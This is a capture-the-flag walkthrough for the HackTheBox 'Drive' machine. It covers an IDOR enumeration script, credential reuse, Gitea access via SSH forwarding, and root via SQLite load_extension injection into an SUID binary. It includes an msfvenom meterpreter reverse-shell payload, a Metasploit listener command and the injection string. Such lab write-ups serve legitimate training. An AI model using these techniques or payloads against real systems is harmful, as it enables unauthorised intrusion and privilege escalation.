## Web service

There is an IDOR in the **reserve** funcionality

I found various files with the following python script:

~~~python
import requests, signal, sys, time
from pwn import *

def handler(sig, frame):
    print("\n[!] Exiting program...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, handler)

p1 = log.progress("Post number")

http_proxy = "http://127.0.0.1:8080"
proxies = {"http": http_proxy}
cookies = {'sessionid': '78r579zrou9jhsniiynte4vzcdrx1842'}

def main():
    for n in range(1,2000):
        url = f"http://drive.htb/{n}/block/"
        r = requests.get(url=url, proxies=proxies, cookies=cookies)
        p1.status(n)
        if len(r.text) != 179:
            print(f"[+] IDOR: {n}")

if __name__ == "__main__":
    main()
~~~

Output:

~~~bash

In the post 79 there are creds for a user called **martin**.

We can access via SSH.

## Pivoting

### Backups

We have 3 SQLite backups at **/var/www/backups/**. But as the note found before suggested, I won't try cracking them for now.

![](@assets/HackTheBox/Drive/database_crack.png)

We also have a `.sqlite3` file. It contains some users and its password hashed.

![](@assets/HackTheBox/Drive/hashed_sqlite.png)

The cracked hash corresponds to the **tomHands** username. But this creds won't work anywhere.

### Gitea

We know there was a filtered port we can try port forwarding to gain access:

~~~bash
❯ ssh martin@10.10.11.235 -L 3000:127.0.0.1:3000
~~~

We have a gitea server.

![](@assets/HackTheBox/Drive/gitea.png)

We can login with the same password we logged in as martin but with **martinCruz** username instead.

There is a **db_backup.sh** where the database backup file password is leaked:

![](@assets/HackTheBox/Drive/7z_database.png)

I checked every backup and in the November one I managed to crack another another password for **tom**:

This time we can log in as **tom** via SSH.

## Privilege escalation

We have an SUID binary in **tom** home folder and a README.txt:

~~~bash
Hi team
after the great success of DoodleGrive, we are planning now to start working on our new project: "DoodleGrive self hosted",it will allow our customers to deploy their own documents sharing platform privately on thier servers...
However in addition with the "new self Hosted release" there should be a tool(doodleGrive-cli) to help the IT team in monitoring server status and fix errors that may happen.
As we mentioned in the last meeting the tool still in the development phase and we should test it properly...
We sent the username and the password in the email for every user to help us in testing the tool and make it better.
If you face any problem, please report it to the development team.
Best regards.
~~~

When executing the binary it asks for an user and a password:

~~~bash
tom@drive:~$ ./doodleGrive-cli 
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
a
Enter password for a:
a
Invalid username or password.
~~~

I brought the binary to my local machine to analyze it with ghidra. Here we can see both the user and password in clear text.

![](@assets/HackTheBox/Drive/user_password.png)

The program uses `fgets()` in order to take user input so we might think about buffer overflow, but there is a sanitizing functions which prevents us from exceding the buffer.

![](@assets/HackTheBox/Drive/fgets.png)

Testing the functions there is only one which takes user input: **5. activate user account**.

![](@assets/HackTheBox/Drive/case_5.png)

Checking it with ghidra reveals the command it is running and where our input is sent:

### SQLite injection

We are working with the following string:

~~~bash
/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SET is_active=1 WHERE username=\"%s\";\'
~~~

We can try injecting the **load_extension()** function to add a malicious extension and gain remote access as root.

First we generate the malicious `.so` file with msfvenom:

~~~bash
❯ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f elf.so -o ex.so
~~~

Now, after transferring the file to the victim machine, we can set our listener:

~~~bash
❯ msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 1337; run'
~~~

Execute the program and inject the following string:

~~~bash
"+load_extension(char(46,47,101,120))+"
~~~

After that we receive our meterpreter session:
